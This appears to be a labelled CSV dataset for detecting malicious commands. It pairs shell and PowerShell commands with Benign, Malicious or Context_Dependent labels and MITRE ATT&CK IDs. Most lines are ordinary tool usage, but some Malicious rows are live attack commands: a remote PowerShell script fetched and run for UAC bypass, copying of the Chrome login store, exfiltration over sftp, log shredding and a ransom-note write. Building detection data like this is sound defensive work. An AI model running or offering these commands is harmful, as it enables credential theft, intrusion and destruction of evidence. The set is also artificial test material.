command,label,original_label,mitre_id
pio lib list,Benign,Benign,Benign
pnmtoxwd path/to/input_file.pnm > path/to/output_file.xwd,Benign,Benign,Benign
gcal 2 2010,Benign,Benign,Benign
apptainer delete --library https://library.example.com library://user/collection/container:tag,Benign,Benign,Benign
wezterm cli activate-pane --pane-id id,Benign,Benign,Benign
opam upgrade,Benign,Benign,Benign
set /p name=prompt_string,Benign,Benign,Benign
systemd-tmpfiles --create --user,Benign,Benign,Benign
quickget --list|--list-csv|--list-json,Benign,Benign,Benign
adb connect ip_address:port,Benign,Benign,Benign
yj < file.toml -ty,Benign,Benign,Benign
calligrasheets path/to/spreadsheet,Benign,Benign,Benign
"find ""$searchpath"" -name ""$filepat.[ch]"" -exec grep --color -aHn ""$greppattern"" {} \;",Benign,Benign,Benign
"find . -type f -name '*.java' -exec sh -c 'iconv -f cp1252 -t utf-8 ""$1"" > converted && mv converted ""$1""' -- {} \;",Benign,Benign,Benign
amdgpu_top --list,Benign,Benign,Benign
mongosh,Benign,Benign,Benign
nest start,Benign,Benign,Benign
"Clear-History -Id id1, id2, ...",Benign,Benign,Benign
rsync -ur dir_a dir_b && rsync -ur dir_b dir_a,Benign,Benign,Benign
kwallet-query kdewallet [-l|--list-entries],Benign,Benign,Benign
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force",Malicious,Malicious,T1484
"cd ""$env:userprofile\Downloads\T1036""",Malicious,Malicious,T1036
find . -name '*.php' | xargs wc -l | sort -r,Benign,Benign,Benign
"alembic revision --autogenerate -m ""message""",Benign,Benign,Benign
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""",Malicious,Malicious,T1555
readlink /proc/2/exe,Context_Dependent,Synthetic,Synthetic
find /TBD -mtime +1 -type d | xargs rm -f -r,Benign,Benign,Benign
powercfg /sleepstudy /output path\to\report.html,Benign,Benign,Benign
fold -w30 longline,Benign,Benign,Benign
pdftex source.tex,Benign,Benign,Benign
shellcheck [-a|--check-sourced] path/to/script.sh,Benign,Benign,Benign
apptainer test [-C|--containall] path/to/image.sif,Benign,Benign,Benign
tldr reg save|restore|load|unload,Benign,Benign,Benign
certutil -decode,Malicious,Malicious,T1140
"df -P ""$path"" | tail -1 | awk '{ print $NF}'",Benign,Benign,Benign
distrobox-export [-a|--app] package [-d|--delete],Benign,Benign,Benign
nextclade dataset get [-n|--name] sars-cov-2 [-o|--output-dir] path/to/directory,Benign,Benign,Benign
"$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""",Malicious,Malicious,T1204
"wuauclt.exe /UpdateDeploymentProvider ""$arbitrary_dll"" /RunHandlerComServer",Malicious,Malicious,T1218
tldr [-p|--platform] dos cd,Benign,Benign,Benign
arc diff,Benign,Benign,Benign
RegWrite,Malicious,Malicious,T1559
kopia policy set --global --add-ignore path/to/file_or_folder,Benign,Benign,Benign
mpstat 2 5,Benign,Benign,Benign
nmap -sP 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
jj squash [-r|--revision] revset,Benign,Benign,Benign
trunk actions history action,Benign,Benign,Benign
"oathtool --totp [-b|--base32] ""secret"" ""token""",Benign,Benign,Benign
depotdownloader -app 108600 -pubfile 2503622437,Benign,Benign,Benign
httpsd,Malicious,Malicious,T1222
ibmcloud [v|version],Benign,Benign,Benign
influx -database database_name,Benign,Benign,Benign
ybacklight Sc/Sm,Benign,Benign,Benign
"csvtool [-c|--column] 2,4 path/to/file.csv",Benign,Benign,Benign
"bind -x '""key_sequence"":command'",Benign,Benign,Benign
"find -type l | while read f; do if [ ! -e ""$f"" ]; then ls -l ""$f""; fi; done",Benign,Benign,Benign
isutf8 [-i|--invert] path/to/file1 path/to/file2 ...,Benign,Benign,Benign
rustfmt path/to/source.rs,Benign,Benign,Benign
winicontopam path/to/input_file.ico > path/to/output.pam,Benign,Benign,Benign
darling shell,Benign,Benign,Benign
find / -name passwd,Context_Dependent,Benign,Benign
dotnet ef dbcontext list,Benign,Benign,Benign
VBoxManage export --manifest,Benign,Benign,Benign
helm install repository_name/chart_name [-g|--generate-name],Benign,Benign,Benign
mount | grep -v tmpfs,Context_Dependent,Synthetic,Synthetic
pygbag path/to/project_folder --no_opt,Benign,Benign,Benign
sudo rm /var/lib/mongodb/mongod.lock,Benign,Benign,Benign
licensor [-p|--keep-placeholder] MIT > LICENSE,Benign,Benign,Benign
github-label-sync --access-token token repository_name,Benign,Benign,Benign
HKCU\Environment\UserInitMprLogonScript,Malicious,Malicious,T1037
chown -R andrewr:andrewr *,Benign,Benign,Benign
az disk update [-g|--resource-group] resource_group [-n|--name] disk_name [-z|--size-gb] new_size_in_gb,Benign,Benign,Benign
nh clean profile path/to/profile,Benign,Benign,Benign
dotty -el 0|1 path/to/graph.gv,Benign,Benign,Benign
"qdbus org.kde.kglobalaccel /component/kmix invokeShortcut ""increase_volume""",Benign,Benign,Benign
"ntfy pub --at=8:30am delayed_topic ""Time for school, sleepyhead...""",Benign,Benign,Benign
limine bios-install path/to/image.iso,Benign,Benign,Benign
"find . -name ""*.php"" | pv --line-mode | xargs chmod 755",Benign,Benign,Benign
xcaddy build,Benign,Benign,Benign
terraform login app.terraform.io/eu,Benign,Benign,Benign
xcodebuild -workspace workspace_name.workspace -scheme scheme_name -configuration configuration_name clean build SYMROOT=SYMROOT_path,Benign,Benign,Benign
basename $(pwd),Benign,Benign,Benign
whois @user,Benign,Benign,Benign
find / -mtime +100 -print,Context_Dependent,Benign,Benign
reindexdb database_name [-h|--host] hostname [-p|--port] port [-U|--username] username,Benign,Benign,Benign
decaffeinate path/to/file.coffee,Benign,Benign,Benign
sfdk --version,Benign,Benign,Benign
git push,Benign,Benign,Benign
thunderbird --profile path/to/profile_directory,Benign,Benign,Benign
swapoff -a,Malicious,Malicious,T1562
crypto key zeroize,Benign,Benign,Benign
ethtool eth0,Benign,Benign,Benign
mandb --filename path/to/file,Benign,Benign,Benign
trash restore file,Benign,Benign,Benign
fossa report,Benign,Benign,Benign
tldr [-p|--platform] linux dd,Benign,Benign,Benign
bpftool map list,Benign,Benign,Benign
"find . ! -perm -g+r,u+r,o+r -prune",Benign,Benign,Benign
who am i,Context_Dependent,Synthetic,Synthetic
zm new,Benign,Benign,Benign
fc /l path\to\file1 path\to\file2,Benign,Benign,Benign
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",Malicious,Malicious,T1574
tldr snap.pkg,Benign,Benign,Benign
set -o emacs,Benign,Benign,Benign
flameshot gui [-c|--clipboard],Benign,Benign,Benign
Start-Process $file1 /S;,Malicious,Malicious,T1219
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self],Malicious,Malicious,T1547
wami --list-topics search_string,Benign,Benign,Benign
meshlabserver -i input.x3d -o output.x3d -s filter_script.mlx -l logfile,Benign,Benign,Benign
msbuild.exe @{PATH:.rsp},Malicious,Malicious,T1036
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),Malicious,Malicious,T1548
w32tm /query /status /verbose,Benign,Benign,Benign
"trap 'echo ""Caught signal SIGHUP""' HUP",Benign,Benign,Benign
g_CiOptions,Malicious,Malicious,T1553
recentFiles.py,Context_Dependent,Malicious,T1083
find . -name “*.[php|PHP]” -print,Benign,Benign,Benign
"git log [-n|--max-count] n --author ""author""",Benign,Benign,Benign
mitmproxy --listen-host ip_address [-p|--listen-port] port,Benign,Benign,Benign
ls [-dlZ|--directory -l --context] path/to/file_or_directory,Benign,Benign,Benign
nix flake info github:owner/repo --json --no-pretty,Benign,Benign,Benign
CreateMutexW(),Malicious,Malicious,T1480
blastn -query query.fa -subject subject.fa -evalue 1e-9,Benign,Benign,Benign
cypher-shell --log path/to/file.log,Benign,Benign,Benign
"echo -ne ""Welcome `whoami`!\n""",Benign,Benign,Benign
psalm --threads 4,Benign,Benign,Benign
dos2unix --keep-bom|add-bom|remove-bom path/to/file,Benign,Benign,Benign
gnmic [-a|--address] ip:port [sub|subscribe] --path path,Benign,Benign,Benign
sed -n 's;\(http://[^/]*/\).*;\1;p',Benign,Benign,Benign
"ping -i seconds ""host""",Benign,Benign,Benign
bash [-r|--restricted],Benign,Benign,Benign
dirb https://example.org,Benign,Benign,Benign
"hello [-g|--greeting] ""greeting_text""",Benign,Benign,Benign
linode-cli tickets replies ticket_id,Benign,Benign,Benign
po4a-gettextize --format text --master path/to/master.txt --localized path/to/translated.txt --po path/to/result.po,Benign,Benign,Benign
evil-winrm [-i|--ip] ip_address [-u|--user] user [-H|--hash] nt_hash,Benign,Benign,Benign
sambaPipe.py -so path/to/file.so -hashes LM_HASH:NT_HASH domain/username:password@target,Benign,Benign,Benign
calcurse-caldav --init=two-way,Benign,Benign,Benign
terragrunt output,Benign,Benign,Benign
"mkdir $(printf ""$HOME/Labs/lab4a/folder%03g "" {0..3})",Benign,Benign,Benign
find . -regextype posix-egrep -regex '.\*c([3-6][0-9]|70).\*',Benign,Benign,Benign
valgrind --tool=cachegrind program,Benign,Benign,Benign
sf force:org:list,Benign,Benign,Benign
microsoft-edge --user-data-dir=path/to/directory --disable-web-security,Benign,Benign,Benign
symfony server:stop,Benign,Benign,Benign
sshfs -o ssh_command=/path/to/command x: /path/to/dir/,Malicious,Malicious,T1059
env DISPLAY=`hostname`:0 skype,Benign,Benign,Benign
balena devices,Benign,Benign,Benign
/etc/hosts,Context_Dependent,Malicious,T1018
steamcmd +login username +logout +quit,Benign,Benign,Benign
lnav -C path/to/log_directory,Benign,Benign,Benign
pve-firewall [c|compile],Benign,Benign,Benign
git squash source_branch,Benign,Benign,Benign
ykman config nfc [-D|--disable-all],Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"" \\$remote_host /user:$user_name /pwd:$password cmd.exe",Malicious,Malicious,T1569
k6 run script.js,Benign,Benign,Benign
svn [up|update],Benign,Benign,Benign
docker network inspect network_name1 network_name2 ...,Benign,Benign,Benign
cargo rustdoc --lib,Benign,Benign,Benign
sudo zerotier-cli leave network_id,Benign,Benign,Benign
"tac temp.txt | sort -k2,2 -r -u",Benign,Benign,Benign
cmd.exe /c %s,Malicious,Malicious,T1059
tree $absolute/path/of/your/dir,Benign,Benign,Benign
~/Library/Preferences/ByHost,Malicious,Malicious,T1547
ss [-4t|--ipv4 --tcp] src 192.168/16,Context_Dependent,Benign,Benign
printenv LANG,Context_Dependent,Malicious,T1614
cargo init,Benign,Benign,Benign
ibmcloud target -c account_id,Benign,Benign,Benign
proxify,Benign,Benign,Benign
pbmtoepsi [-b|-bbonly] path/to/image.pbm > path/to/output.bmp,Benign,Benign,Benign
az advisor recommendation list,Benign,Benign,Benign
"mp3info -a ""artist_name"" -t ""song_title"" -l ""album_title"" -y year -c ""comment_text"" path/to/file.mp3",Benign,Benign,Benign
"""c:\Program Files\Wireshark\tshark.exe"" -i $interface -c 5",Context_Dependent,Malicious,T1040
ng update package,Benign,Benign,Benign
mkid [-o|--output] path/to/database.id,Benign,Benign,Benign
psping /?,Benign,Benign,Benign
bower help command,Benign,Benign,Benign
fprintd-list,Benign,Benign,Benign
"gocr -m 130 -p path/to/db_directory -i path/to/input_image.png -o path/to/output_file.txt -C ""0..9""",Benign,Benign,Benign
pnmtopalm [-c|-colormap] path/to/file.pnm > path/to/file.palm,Benign,Benign,Benign
cat *.txt | tail -n +1001 | split --lines=1000,Benign,Benign,Benign
systemd-nspawn [-D|--directory] path/to/container_root,Benign,Benign,Benign
fwupdtool get-devices,Benign,Benign,Benign
goku,Benign,Benign,Benign
tgatoppm [-a|-alphaout] path/to/transparency_file.pgm path/to/file.tga > path/to/output.ppm,Benign,Benign,Benign
vgs 2>/dev/null,Context_Dependent,Synthetic,Synthetic
encfs /path/to/cipher_directory /path/to/mount_point,Benign,Benign,Benign
size path/to/file,Benign,Benign,Benign
xsetwacom list,Benign,Benign,Benign
transmission-remote hostname [-w|--download-dir] /path/to/download_directory,Benign,Benign,Benign
find . -exec grep PENWIDTH {} \; | more,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" *",Context_Dependent,Malicious,T1087
tmux kill-session -t name,Benign,Benign,Benign
nix flake --help,Benign,Benign,Benign
"join -t, -a1 -a2 <(sort file1) <(sort file2)",Benign,Benign,Benign
"find ""$1"" -type f | egrep -v '\.bz2' | xargs bzip2 -9 &",Benign,Benign,Benign
terraform destroy -target resource_type.resource_name[instance_index],Benign,Benign,Benign
"find /root -type f -size +500M -printf ""The %p file is greater than 500MB\n""",Benign,Benign,Benign
vcsh write-gitignore repository_name,Benign,Benign,Benign
dillo path/to/file_or_directory,Benign,Benign,Benign
tldr [-p|--platform] common microsoft-edge,Benign,Benign,Benign
driverquery /v,Benign,Benign,Benign
"QueueName = """"",Context_Dependent,Malicious,T1619
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";",Malicious,Malicious,T1547
find . -name “*.old” -print | wc -l,Benign,Benign,Benign
"fd ""string|regex"" [-x|--exec] command",Benign,Benign,Benign
waitpid pid1 pid2 ...,Benign,Benign,Benign
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU,Malicious,Malicious,T1547
passwd,Benign,Benign,Benign
lsof,Context_Dependent,Malicious,T1049
find -mindepth 3 -maxdepth 5 -name passw,Benign,Benign,Benign
flips --create path/to/original_file path/to/modified_file path/to/output_patch.bps,Benign,Benign,Benign
arping -c 3 10.0.0.10,Context_Dependent,Synthetic,Synthetic
type xxd,Context_Dependent,Synthetic,Synthetic
openssl x509 -inform der -outform pem -in original_certificate_file -out converted_certificate_file,Benign,Benign,Benign
sbatch --nodes=3 path/to/job.sh,Benign,Benign,Benign
compress $* &,Benign,Benign,Benign
netstat -s,Context_Dependent,Benign,Benign
find -L . -type l -delete -exec ln -s new_target {} \;,Benign,Benign,Benign
vcluster platform create vcluster_name [-n|--namespace] namespace,Benign,Benign,Benign
opkg files package,Benign,Benign,Benign
xman,Benign,Benign,Benign
mitmweb --scripts path/to/script.py,Benign,Benign,Benign
mongodump [-o|--out] path/to/directory,Benign,Benign,Benign
z string,Benign,Benign,Benign
sudo pacman -S package=version,Benign,Benign,Benign
phpcbf -i,Benign,Benign,Benign
find ~ -iname '*.jpg' -exec ls {} \;,Benign,Benign,Benign
screenfetch,Benign,Benign,Benign
vkcube --wsi xlib|wayland|...,Benign,Benign,Benign
tail -20 /etc/nsswitch.conf,Context_Dependent,Synthetic,Synthetic
photo_high_resj.png,Malicious,Malicious,T1036
alias prettyjson='python -m json.tool',Benign,Benign,Benign
agetty tty 115200,Benign,Benign,Benign
else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue },Malicious,Malicious,T1560
laravel list,Benign,Benign,Benign
find ~/code -name '.*' -prune -o -type f -a -perm /u+x -printf ':%h\n' | sort | uniq | tr -d '\n',Benign,Benign,Benign
tar cz my_large_file_1 my_large_file_2 | split -b 1024MiB - myfiles_split.tgz_,Benign,Benign,Benign
wireplumber --version,Benign,Benign,Benign
sed '' /path/to/input-file,Context_Dependent,Malicious,T1005
kernel32.beep,Malicious,Malicious,T1497
fc-cache [-r|--really-force],Benign,Benign,Benign
pixi config unset key,Benign,Benign,Benign
"grpcurl -H ""Authorization: Bearer $token"" -d '{""foo"": ""bar""}' grpc.server.com:443 my.custom.server.Service/Method",Benign,Benign,Benign
sudo slabtop,Benign,Benign,Benign
"slop [-c|--color] red,green,blue,alpha",Benign,Benign,Benign
"ssh -S ""$SSHSOCKET"" -O exit ""$USER_AT_HOST""",Benign,Benign,Benign
btop [-p|--preset] 0..9,Benign,Benign,Benign
ls -d */ | xargs -iA cp file.txt A,Benign,Benign,Benign
nxcdb,Benign,Benign,Benign
aws ses list-receipt-rule-sets --starting-token token_string --max-items integer --generate-cli-skeleton,Benign,Benign,Benign
uname -m | grep '64',Benign,Benign,Benign
"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",Malicious,Malicious,T1098
dolt add [-A|--all],Benign,Benign,Benign
find . -name ‘*.c’ | xargs egrep stdlib.h,Benign,Benign,Benign
"black [-c|--code] ""code""",Benign,Benign,Benign
lsappinfo info com.apple.calculator,Benign,Benign,Benign
gksu [-u|--user] userid command,Benign,Benign,Benign
eksctl create cluster --name=name --nodes=4 --auto-kubeconfig,Benign,Benign,Benign
npm query '#package@semantic_version',Benign,Benign,Benign
ipcrm [-s|--semaphore-id] semaphore_id,Benign,Benign,Benign
C:\Windows\system32\net.exe,Malicious,Malicious,T1574
xwininfo -tree -root,Benign,Benign,Benign
"xml [ed|edit] [-m|--move] ""XPATH1"" ""XPATH2"" path/to/input.xml|URI",Benign,Benign,Benign
getArch.py -target target,Benign,Benign,Benign
find . -type f -empty | wc -l,Benign,Benign,Benign
find src/ -type d -exec mkdir -p dest/{} \; -o -type f -exec touch dest/{} \;,Benign,Benign,Benign
"read -p ""$1 "" yn",Benign,Benign,Benign
cd $(readlink -f $(dirname $0)),Benign,Benign,Benign
Start-Process $file1,Malicious,Malicious,T1204
rename [-o|--no-overwrite] foo bar *,Benign,Benign,Benign
phpstorm path/to/file,Benign,Benign,Benign
reg command /?,Benign,Benign,Benign
which [-a|--all] executable,Context_Dependent,Benign,Benign
free -m,Context_Dependent,Synthetic,Synthetic
systemctl list-sockets --state active|inactive|failed|...,Benign,Benign,Benign
nc -lnvp 8080,Context_Dependent,Synthetic,Synthetic
flask-unsign [-d|--decode] [-c|--cookie] cookie,Benign,Benign,Benign
updog --directory /path/to/directory,Benign,Benign,Benign
gleam run,Benign,Benign,Benign
newrole [-l|--level] s0-s0:c0.c1023,Benign,Benign,Benign
sha1sum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"numactl --cpunodebind=0 --membind=0,1 -- command command_arguments",Benign,Benign,Benign
aws s3api get-object --bucket bucket_name --key object_key path/to/output_file,Benign,Benign,Benign
w [-h|--no-header],Context_Dependent,Benign,Benign
pv [-cN|--cursor --name] in path/to/file.txt | grep pattern | pv [-cN|--cursor --name] out > path/to/filtered_file.txt,Benign,Benign,Benign
lpadmin -p printer -c class,Benign,Benign,Benign
traceroute [-I|--icmp] example.com,Context_Dependent,Benign,Benign
OpenSSH,Malicious,Malicious,T1129
createdb database_name,Benign,Benign,Benign
"find . -maxdepth 1 -name ""$a"" -print -quit",Benign,Benign,Benign
docsify generate path/to/directory,Benign,Benign,Benign
pacinfo package_name,Benign,Benign,Benign
kpackagetool5 [-t|--type] package_type [-u|--upgrade] path/to/directory,Benign,Benign,Benign
spf path/to/directory,Benign,Benign,Benign
sudo apparmor_parser [-C|--complain] [-r|--replace] path/to/profile,Benign,Benign,Benign
daemonize -l path/to/lockfile command command_arguments,Benign,Benign,Benign
find . -name not\* | tail -1 | xargs rm,Benign,Benign,Benign
spotify play song_name,Benign,Benign,Benign
"$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null",Malicious,Malicious,T1552
openstack volume set --name volume_new_name --size volume_new_size --attached|--detached --bootable|--non-bootable volume_id,Benign,Benign,Benign
doctl compute [d|droplet] [ls|list],Benign,Benign,Benign
"sm ""Hello World!""",Benign,Benign,Benign
glow https://example.com/file.md,Benign,Benign,Benign
wc -l file,Benign,Benign,Benign
"echo ""$(pwd)/$(basename ""$1"")""",Benign,Benign,Benign
ranger --datadir path/to/directory,Benign,Benign,Benign
"VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:""{CMD:args}""",Malicious,Malicious,T1127
phpenv rehash,Benign,Benign,Benign
picotool reboot,Benign,Benign,Benign
"echo ""put $local_path\$file_name"" | sftp $username@$remote_host:$remote_path",Malicious,Malicious,T1105
groff path/to/input.roff > path/to/output.ps,Benign,Benign,Benign
gulp --tasks,Benign,Benign,Benign
xkcdpass,Benign,Benign,Benign
dnstracer -v www.example.com,Benign,Benign,Benign
roave-backward-compatibility-check --format=markdown > results.md,Benign,Benign,Benign
pacman -Th,Benign,Benign,Benign
find /tmp -type f -ls,Context_Dependent,Synthetic,Synthetic
carbon-now [-e|--end] line path/to/file,Benign,Benign,Benign
tldr let,Benign,Benign,Benign
consul subcommand --help,Benign,Benign,Benign
net group /dom,Context_Dependent,Malicious,T1087
duf --only-fs|hide-fs tmpfs|vfat|ext4|xfs,Benign,Benign,Benign
"cmstp.exe /s ""$inf_file_uac"" /au",Malicious,Malicious,T1218
rabbitmq-upgrade drain,Benign,Benign,Benign
ctr images list,Benign,Benign,Benign
mpd,Benign,Benign,Benign
filebrowser [-c|--config] path/to/file [-d|--database] path/to/database.db [-r|--root] path/to/directory,Benign,Benign,Benign
dart compile exe path/to/file.dart,Benign,Benign,Benign
"PPID-Spoof -ppid $ppid -spawnto ""$spawnto_process_path"" -dllpath ""$dll_path""",Malicious,Malicious,T1134
ng extract-i18n --out-file path/to/file,Benign,Benign,Benign
mycli [-h|--host] database_host [-P|--port] port [-u|--user] username database_name,Benign,Benign,Benign
find .*,Benign,Benign,Benign
wmic process call create $process_to_execute,Malicious,Malicious,T1047
find . -mindepth 1 -exec mv -t /tmp {} +,Benign,Benign,Benign
sbuild --extra-package path/to/file_or_directory,Benign,Benign,Benign
flock path/to/lock.lock command,Benign,Benign,Benign
"echo ""on"" | tee /sys/bus/usb/devices/usb*/power/level",Benign,Benign,Benign
"find /the/path -depth -type f -name ""*.abc"" -exec sh -c 'mv ""$1"" ""$(dirname ""$1"")/$(basename ""$1"" .abc).edefg""' _ {} \;",Benign,Benign,Benign
cupsctl --debug-logging|--no-debug-logging,Benign,Benign,Benign
godot [-s|--script] script.gd,Benign,Benign,Benign
pngtopam path/to/image.png > path/to/output.pam,Benign,Benign,Benign
u3d available,Benign,Benign,Benign
find /usr/src -name '*.c' -size +100k -print,Benign,Benign,Benign
xfreerdp /u:username /p:password /v:ip_address /sound:sys:alsa,Benign,Benign,Benign
od -t x1 -t a /dev/ttySomething,Benign,Benign,Benign
acme.sh --issue --dns dns_namesilo --domain example.com --domain *.example.com,Benign,Benign,Benign
sudo btrfs [c|check] [-s|--super] n path/to/partition,Benign,Benign,Benign
gh issue [new|create] [-F|--body-file] path/to/file,Benign,Benign,Benign
"find . -type f -iname ""*.jpg"" -ls | awk 'BEGIN {print ""0""}; {print $7, ""+""}; END {print ""p""}' | dc",Benign,Benign,Benign
ifstat,Benign,Benign,Benign
isisdl --compress,Benign,Benign,Benign
brightness 0.5,Benign,Benign,Benign
print path\to\file,Benign,Benign,Benign
"echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
find . -mtime -1 -ls,Benign,Benign,Benign
bun pm version,Benign,Benign,Benign
ldapdomaindump --no-json [-o|--outdir] path/to/directory [-u|--user] domain\username [-p|--password]password hostname|ip,Benign,Benign,Benign
winrm,Malicious,Malicious,T1021
coffee --compile path/to/file.coffee,Benign,Benign,Benign
pecl,Benign,Benign,Benign
"find my_folder -type f -exec grep -l ""needle text"" {} \; -exec file {} \; | grep text",Benign,Benign,Benign
pkg_delete -n package,Benign,Benign,Benign
hg add [-X|--exclude] pattern,Benign,Benign,Benign
"qr ""data""",Benign,Benign,Benign
mcat [-o|--output] format path/to/file,Benign,Benign,Benign
namei [-m|--modes] path/to/a path/to/b path/to/c,Benign,Benign,Benign
"echo -e ""red\ngreen\nblue"" | fuzzel [-d|--dmenu] > color.txt",Benign,Benign,Benign
"sudo xfs_admin [-L|--Label] ""label"" /dev/sdX",Benign,Benign,Benign
pulumi login,Benign,Benign,Benign
azurite [-d|--debug] path/to/debug.log,Benign,Benign,Benign
jj config [u|unset] --repo name,Benign,Benign,Benign
jc ifconfig,Benign,Benign,Benign
"echo ""$(date): "" $line",Benign,Benign,Benign
pdftotext texput.pdf -,Context_Dependent,Malicious,T1005
stolonctl --cluster-name cluster_name --store-backend store_backend --store-endpoints store_endpoints status,Benign,Benign,Benign
koboldcpp --launch,Benign,Benign,Benign
cron,Malicious,Malicious,T1053
pcdovtoppm [-m|-maxwidth] width [-s|-size] size path/to/file.pcd > path/to/output.ppm,Benign,Benign,Benign
apptainer inspect [-r|--runscript] path/to/image.sif,Benign,Benign,Benign
"Set objws = CreateObject(""Wscript.Shell"")",Malicious,Malicious,T1546
sprio [-w|--weights],Benign,Benign,Benign
"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",Malicious,Malicious,T1070
